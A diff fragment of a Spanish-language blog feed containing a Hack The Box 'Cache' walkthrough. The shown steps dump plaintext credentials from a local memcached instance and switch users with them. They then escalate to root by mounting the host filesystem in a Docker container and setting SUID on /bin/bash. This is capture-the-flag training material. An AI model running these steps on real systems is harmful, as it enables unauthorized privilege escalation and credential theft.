+./snap/core/9436/usr/bin/chsh
+./snap/core/9436/usr/bin/gpasswd 
+./snap/core/9436/usr/bin/newgrp
+./snap/core/9436/usr/bin/passwd
+./snap/core/9436/usr/bin/sudo
+./snap/core/9436/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+./snap/core/9436/usr/lib/openssh/ssh-keysign
+./snap/core/9436/usr/lib/snapd/snap-confine
+./snap/core/9436/usr/sbin/pppd
+./snap/core/9993/bin/mount
+./snap/core/9993/bin/ping
+./snap/core/9993/bin/ping6
+./snap/core/9993/bin/su
+./snap/core/9993/bin/umount
+./snap/core/9993/usr/bin/chfn
+./snap/core/9993/usr/bin/chsh
+./snap/core/9993/usr/bin/gpasswd 
+./snap/core/9993/usr/bin/newgrp
+./snap/core/9993/usr/bin/passwd
+./snap/core/9993/usr/bin/sudo
+./snap/core/9993/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+./snap/core/9993/usr/lib/openssh/ssh-keysign
+./snap/core/9993/usr/lib/snapd/snap-confine
+./snap/core/9993/usr/sbin/pppd
+./usr/bin/newgidmap
+./usr/bin/newuidmap
+./usr/bin/passwd
+./usr/bin/traceroute6.iputils
+./usr/bin/newgrp
+./usr/bin/gpasswd
+./usr/bin/chfn
+./usr/bin/pkexec
+./usr/bin/chsh
+./usr/bin/at
+./usr/bin/sudo
+./usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
+./usr/lib/snapd/snap-confine
+./usr/lib/dbus-1.0/dbus-daemon-launch-helper
+./usr/lib/policykit-1/polkit-agent-helper-1
+./usr/lib/eject/dmcrypt-get-device
+./usr/lib/openssh/ssh-keysign
+ash@cache:/&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Dentro de los permisos SUID vemos el pkexec; sin embargo, vamos a tratar de resolver la máquina como esta pensada; por lo tanto, vamos a ver los procesos que están corriendo en el sistema.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ash@cache:/&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ps &lt;span class=&quot;nt&quot;&gt;-faux&lt;/span&gt;                                                                                                            
+USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND                       
+root         2  0.0  0.0      0     0 ?        S    Mar12   0:00 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;kthreadd]                                                      
+root         4  0.0  0.0      0     0 ?        I&amp;lt;   Mar12   0:00  &lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;kworker/0:0H]
+root         6  0.0  0.0      0     0 ?        I&amp;lt;   Mar12   0:00  &lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;mm_percpu_wq]       
+root         7  0.0  0.0      0     0 ?        S    Mar12   0:00  &lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;ksoftirqd/0]                       
+root         8  0.0  0.0      0     0 ?        I    Mar12   0:03  &lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;rcu_sched]       
+root         9  0.0  0.0      0     0 ?        I    Mar12   0:00  &lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;rcu_bh]                                                    
+root        10  0.0  0.0      0     0 ?        S    Mar12   0:00  &lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;migration/0]                                               
+root        11  0.0  0.0      0     0 ?        S    Mar12   0:00  &lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;watchdog/0]                 
+root        12  0.0  0.0      0     0 ?        S    Mar12   0:00  &lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;cpuhp/0]    
+root        13  0.0  0.0      0     0 ?        S    Mar12   0:00  &lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;cpuhp/1]       
+root        14  0.0  0.0      0     0 ?        S    Mar12   0:00  &lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;watchdog/1]   
+root        15  0.0  0.0      0     0 ?        S    Mar12   0:00  &lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;migration/1]                                               
+root        16  0.0  0.0      0     0 ?        S    Mar12   0:00  &lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;ksoftirqd/1]                      
+root        18  0.0  0.0      0     0 ?        I&amp;lt;   Mar12   0:00  &lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;kworker/1:0H]
+root        19  0.0  0.0      0     0 ?        S    Mar12   0:00  &lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;kdevtmpfs]
+&lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt;
+root       970  0.0  0.2  88228  9560 ?        Ss   Mar12   0:00 /usr/bin/VGAuthService
+root      1007  0.0  0.4 169100 17192 ?        Ssl  Mar12   0:00 /usr/bin/python3 /usr/bin/networkd-dispatcher &lt;span class=&quot;nt&quot;&gt;--run-startup-trig&lt;/span&gt;
+memcache  1008  0.0  0.0 425792  3944 ?        Ssl  Mar12   0:04 /usr/bin/memcached &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; 64 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; 11211 &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; memcache &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt; 127.0.0.1 &lt;span class=&quot;nt&quot;&gt;-P&lt;/span&gt; /v
+root      1024  0.0  0.0 110548  2040 ?        Ssl  Mar12   0:00 /usr/sbin/irqbalance &lt;span class=&quot;nt&quot;&gt;--foreground&lt;/span&gt;
+root      1025  0.0  0.0  30028  3252 ?        Ss   Mar12   0:00 /usr/sbin/cron &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt;
+root      1028  0.0  0.7 859748 29648 ?        Ssl  Mar12   0:02 /usr/lib/snapd/snapd
+root      1029  0.0  0.9 883080 39136 ?        Ssl  Mar12   0:02 /usr/bin/containerd
+root      1032  0.0  0.4 185944 20180 ?        Ssl  Mar12   0:00 /usr/bin/python3 /usr/share/unattended-upgrades/unattended-upgra
+root      1098  0.0  0.1 288884  6536 ?        Ssl  Mar12   0:00 /usr/lib/policykit-1/polkitd &lt;span class=&quot;nt&quot;&gt;--no-debug&lt;/span&gt;
+root      1178  0.0  0.1  72300  5676 ?        Ss   Mar12   0:00 /usr/sbin/sshd &lt;span class=&quot;nt&quot;&gt;-D&lt;/span&gt;
+root      1179  0.0  0.0  14888  1964 tty1     Ss+  Mar12   0:00 /sbin/agetty &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt; &lt;span class=&quot;se&quot;&gt;\u&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--noclear&lt;/span&gt; tty1 linux
+mysql     1228  0.1  6.5 1628852 265532 ?      Sl   Mar12   0:19 /usr/sbin/mysqld &lt;span class=&quot;nt&quot;&gt;--daemonize&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--pid-file&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/run/mysqld/mysqld.pid
+root      1587  0.0  0.4 364496 19788 ?        Ss   Mar12   0:00 /usr/sbin/apache2 &lt;span class=&quot;nt&quot;&gt;-k&lt;/span&gt; start
+&lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Uno que ya nos llama la atención es &lt;strong&gt;memcache&lt;/strong&gt;, así que vamos a buscar un poco de que se trata y que podemos hacer. Encontramos el recurso &lt;a href=&quot;https://lzone.de/cheat-sheet/memcached&quot;&gt;lzone.de&lt;/a&gt; en donde nos indica que informarción podemos obtener. Asi que primero vamos a conectarnos vía telnet.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ash@cache:/&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;telnet 127.0.0.1 11211
+Trying 127.0.0.1...     
+Connected to 127.0.0.1.     
+Escape character is &lt;span class=&quot;s1&quot;&gt;'^]'&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;                                       
+stats                                                           
+STAT pid 1008                                                   
+STAT &lt;span class=&quot;nb&quot;&gt;uptime &lt;/span&gt;14578              
+STAT &lt;span class=&quot;nb&quot;&gt;time &lt;/span&gt;1647140837                                            
+STAT version 1.5.6 Ubuntu   
+STAT libevent 2.1.8-stable
+STAT pointer_size 64      
+STAT rusage_user 1.812221   
+STAT rusage_system 2.446285                                     
+STAT max_connections 1024
+STAT curr_connections 1  
+STAT total_connections 246
+STAT rejected_connections 0
+STAT connection_structures 2
+STAT reserved_fds 20
+&lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt;
+STAT moves_to_warm 0
+STAT moves_within_lru 0
+STAT direct_reclaims 0
+STAT lru_bumps_dropped 0
+END
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Leyendo un poco, vemos que podemos obtener unas &lt;strong&gt;keys&lt;/strong&gt; con el comando &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;stats items&lt;/code&gt;:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;stats items
+STAT items:1:number 5
+STAT items:1:number_hot 0
+STAT items:1:number_warm 0
+STAT items:1:number_cold 5
+STAT items:1:age_hot 0
+STAT items:1:age_warm 0
+STAT items:1:age 57
+STAT items:1:evicted 0
+STAT items:1:evicted_nonzero 0
+STAT items:1:evicted_time 0
+STAT items:1:outofmemory 0
+STAT items:1:tailrepairs 0
+STAT items:1:reclaimed 0
+STAT items:1:expired_unfetched 0
+STAT items:1:evicted_unfetched 0
+STAT items:1:evicted_active 0
+STAT items:1:crawler_reclaimed 0
+STAT items:1:crawler_items_checked 84
+STAT items:1:lrutail_reflocked 0
+STAT items:1:moves_to_cold 1225
+STAT items:1:moves_to_warm 0
+STAT items:1:moves_within_lru 0
+STAT items:1:direct_reclaims 0
+STAT items:1:hits_to_hot 0
+STAT items:1:hits_to_warm 0
+STAT items:1:hits_to_cold 0
+STAT items:1:hits_to_temp 0
+END
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;En este caso, vemos que solo tenemos el item número 1 (definida mejor como clase). Y para dumpear las &lt;strong&gt;keys&lt;/strong&gt;, aplicamos el comando &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;stats cachedump &amp;lt;slab class&amp;gt; &amp;lt;number of items to dump&amp;gt;&lt;/code&gt;, que sería &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;stats cachedump 1 0&lt;/code&gt; (el 0 es para ir probando).&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;stats cachedump 1 0
+ITEM &lt;span class=&quot;nb&quot;&gt;link&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;21 b&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; 0 s]
+ITEM user &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;5 b&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; 0 s]
+ITEM passwd &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;9 b&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; 0 s]
+ITEM file &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;7 b&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; 0 s]
+ITEM account &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;9 b&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; 0 s]
+END
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Vemos un campo &lt;strong&gt;user&lt;/strong&gt; y uno de &lt;strong&gt;passwd&lt;/strong&gt;. Para obtener su valor, ocupamos el comando &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;get&lt;/code&gt;:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;get user
+VALUE user 0 5
+luffy
+END
+get passwd
+VALUE passwd 0 9
+0n3_p1ec3
+END
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Tenemos la credencial &lt;strong&gt;luffy : 0n3_p1ec3&lt;/strong&gt;; por lo que podríamos tratar de migrar a dicho usuario.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ash@cache:/&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;su luffy
+Password: 
+luffy@cache:/&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;whoami
+&lt;/span&gt;luffy
+luffy@cache:/&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Nos convertimos en el usuario &lt;strong&gt;luffy&lt;/strong&gt; y vemos que se encuentra en el grupo &lt;strong&gt;docker&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;luffy@cache:/&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;id
+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1001&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;luffy&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1001&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;luffy&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1001&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;luffy&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,999&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;docker&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+luffy@cache:/&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Por lo tanto, ya tenemos una posible vía para convertirnos en &lt;strong&gt;root&lt;/strong&gt; creando un contenedor (en este caso ya lo tenemos) y crear una montura dentro del contener de la raiz del sistema principal; con esto, podemos ingresar al contenedor como &lt;strong&gt;root&lt;/strong&gt; y modificar cualquier archivo, incluyendo la montura.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;luffy@cache:/&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;docker images
+REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE
+ubuntu              latest              2ca708c1c9cc        2 years ago         64.2MB
+luffy@cache:/&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;docker ps
+CONTAINER ID        IMAGE               COMMAND             CREATED             STATUS              PORTS               NAMES
+luffy@cache:/&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;docker ps &lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt;
+CONTAINER ID        IMAGE               COMMAND             CREATED             STATUS              PORTS               NAMES
+luffy@cache:/&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Aprovechamos la imagen que ya esta &lt;strong&gt;ubuntu&lt;/strong&gt; y creamos el contenedor.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;luffy@cache:/&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;docker run &lt;span class=&quot;nt&quot;&gt;--rm&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-dit&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--name&lt;/span&gt; privesc ubuntu
+9c85c1a826d694eebb3ba9f0cc84c1b52f6db278ef6f02009f390d7737862726
+luffy@cache:/&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;docker ps
+CONTAINER ID        IMAGE               COMMAND             CREATED             STATUS              PORTS               NAMES
+9c85c1a826d6        ubuntu              &lt;span class=&quot;s2&quot;&gt;&quot;/bin/bash&quot;&lt;/span&gt;         4 seconds ago       Up 1 second                             privesc
+luffy@cache:/&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;De forma interactiva nos desplegamos una &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/bin/bash&lt;/code&gt; para nuestro contenedor &lt;strong&gt;privesc&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;luffy@cache:/&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;docker &lt;span class=&quot;nb&quot;&gt;exec&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-it&lt;/span&gt; privesc /bin/bash
+root@9c85c1a826d6:/#
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Creamos la montura de la raiz del sistema principal; por lo que antes paramos el contenedor y creamos uno nuevo:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;luffy@cache:/&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;docker ps &lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt;
+CONTAINER ID        IMAGE               COMMAND             CREATED             STATUS              PORTS               NAMES
+9c85c1a826d6        ubuntu              &lt;span class=&quot;s2&quot;&gt;&quot;/bin/bash&quot;&lt;/span&gt;         4 minutes ago       Up 4 minutes                            privesc
+luffy@cache:/&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
+luffy@cache:/&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;docker stop privesc
+privesc
+luffy@cache:/&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;docker ps &lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt;
+CONTAINER ID        IMAGE               COMMAND             CREATED             STATUS              PORTS               NAMES
+luffy@cache:/&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;luffy@cache:/&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;docker run &lt;span class=&quot;nt&quot;&gt;--rm&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; /:/mnt/root &lt;span class=&quot;nt&quot;&gt;-dit&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--name&lt;/span&gt; privesc ubuntu
+6ab913d0e201d03cb938fb723f06414f1463196ac686112681978899fdccf2cf
+luffy@cache:/&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;docker &lt;span class=&quot;nb&quot;&gt;exec&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-it&lt;/span&gt; privesc /bin/bash
+root@6ab913d0e201:/#
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Ahora si checamos el recurso &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/mnt/root/&lt;/code&gt; dentro del contenedor, tenemos montado la raiz del sistema principal.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@6ab913d0e201:/# &lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt; /mnt/root/
+total 1645660
+drwxr-xr-x   2 root root       4096 Jul  9  2020 bin
+drwxr-xr-x   3 root root       4096 Sep 16  2020 boot
+drwxr-xr-x  18 root root       3900 Mar 12 23:04 dev
+drwxr-xr-x  99 root root       4096 Jul  9  2020 etc
+drwxr-xr-x   4 root root       4096 Sep 17  2019 home
+lrwxrwxrwx   1 root root         34 Jul  9  2020 initrd.img -&amp;gt; boot/initrd.img-4.15.0-109-generic
+lrwxrwxrwx   1 root root         33 Jul  9  2020 initrd.img.old -&amp;gt; boot/initrd.img-4.15.0-99-generic
+drwxr-xr-x  22 root root       4096 Sep 18  2019 lib
+drwxr-xr-x   2 root root       4096 Jul  9  2020 lib64
+drwx------   2 root root      16384 Sep 17  2019 lost+found
+drwxr-xr-x   2 root root       4096 Feb 14  2019 media
+drwxr-xr-x   2 root root       4096 Feb 14  2019 mnt
+drwxr-xr-x   3 root root       4096 Sep 18  2019 opt
+dr-xr-xr-x 193 root root          0 Mar 12 23:04 proc
+drwx------   6 root root       4096 Sep 16  2020 root
+drwxr-xr-x  31 root root       1020 Mar 12 23:05 run
+drwxr-xr-x   2 root root      12288 Jul  9  2020 sbin
+drwxr-xr-x   4 root root       4096 Sep 17  2019 snap
+drwxr-xr-x   2 root root       4096 Feb 14  2019 srv
+&lt;span class=&quot;nt&quot;&gt;-rw-------&lt;/span&gt;   1 root root 1685061632 Sep 17  2019 swap.img
+dr-xr-xr-x  13 root root          0 Mar 12 23:04 sys
+drwxrwxrwt  12 root root       4096 Mar 13 03:29 tmp
+drwxr-xr-x  10 root root       4096 Feb 14  2019 usr
+drwxr-xr-x  14 root root       4096 Sep 17  2019 var
+lrwxrwxrwx   1 root root         31 Jul  9  2020 vmlinuz -&amp;gt; boot/vmlinuz-4.15.0-109-generic
+lrwxrwxrwx   1 root root         30 Jul  9  2020 vmlinuz.old -&amp;gt; boot/vmlinuz-4.15.0-99-generic
+root@6ab913d0e201:/#
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Aprovechando los privilegios que tenemos sobre el contenedor, podemos darle permisos SUID a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/bin/bash&lt;/code&gt; que se encuentra bajo la ruta &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/mnt/root&lt;/code&gt;, es decir &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;chmod 4755 /mnt/root/bin/bash&lt;/code&gt;:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@6ab913d0e201:/# &lt;span class=&quot;nb&quot;&gt;chmod &lt;/span&gt;4755 /mnt/root/bin/bash 
+root@6ab913d0e201:/# &lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt; /mnt/root/bin/bash
+&lt;span class=&quot;nt&quot;&gt;-rwsr-xr-x&lt;/span&gt; 1 root root 1113504 Apr  4  2018 /mnt/root/bin/bash
+root@6ab913d0e201:/# 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Nos salimos del contenedor y lo paramos. Si vemos los permisos en la máquina principal de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/bin/bash&lt;/code&gt;, vemos que es SUID.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;luffy@cache:/&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;docker stop privesc
+privesc
+luffy@cache:/&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;docker ps &lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt;
+CONTAINER ID        IMAGE               COMMAND             CREATED             STATUS              PORTS               NAMES
+luffy@cache:/&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt; /bin/bash
+&lt;span class=&quot;nt&quot;&gt;-rwsr-xr-x&lt;/span&gt; 1 root root 1113504 Apr  4  2018 /bin/bash
+luffy@cache:/&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Ya aquí podemos migrar a &lt;strong&gt;root&lt;/strong&gt; facilmente.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;luffy@cache:/&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;bash &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt;
+bash-4.4# &lt;span class=&quot;nb&quot;&gt;whoami
+&lt;/span&gt;root
+bash-4.4#
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Ya somos el usuario &lt;strong&gt;root&lt;/strong&gt; y podemos visualizar la flag (root.txt).&lt;/p&gt;</content><author><name>K4miyo</name></author><category term="Sandbox_Escape" /><summary type="html">Resolución de la máquina Cache en la plataforma de Hack The Box</summary></entry><entry><title type="html">Hack The Box Bank</title><link href="http://localhost:4000/htb-bank/" rel="alternate" type="text/html" title="Hack The Box Bank" /><published>2022-02-28T00:00:00-06:00</published><updated>2022-02-28T00:00:00-06:00</updated><id>http://localhost:4000/htb-bank</id><content type="html" xml:base="http://localhost:4000/htb-bank/">&lt;p&gt;&lt;img src=&quot;/assets/images/htb-bank/banner-bank.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 
 &lt;h2 id=&quot;bank&quot;&gt;Bank&lt;/h2&gt;
 &lt;p&gt;Se procede con la fase de reconocimiento lanzando primeramente un &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ping&lt;/code&gt; a la dirección IP 10.10.10.29.&lt;/p&gt;
@@ -4815,376 +5512,4 @@ root@forwardslash:~# &lt;span class=&quot;nb&quot;&gt;whoami
 root@forwardslash:~#
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;p&gt;Ya somos el usuario &lt;strong&gt;root&lt;/strong&gt; y podemos visualizar la flag (root.txt).&lt;/p&gt;</content><author><name>K4miyo</name></author><category term="XXE" /><category term="Cryptography" /><category term="Web" /><summary type="html">Resolución de la máquina ForwardSlash en la plataforma de Hack The Box</summary></entry><entry><title type="html">Hack The Box Popcorn</title><link href="http://localhost:4000/htb-popcorn/" rel="alternate" type="text/html" title="Hack The Box Popcorn" /><published>2022-01-16T00:00:00-06:00</published><updated>2022-01-16T00:00:00-06:00</updated><id>http://localhost:4000/htb-popcorn</id><content type="html" xml:base="http://localhost:4000/htb-popcorn/">&lt;p&gt;&lt;img src=&quot;/assets/images/htb-popcorn/banner-popcorn.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;h2 id=&quot;popcorn&quot;&gt;Popcorn&lt;/h2&gt;
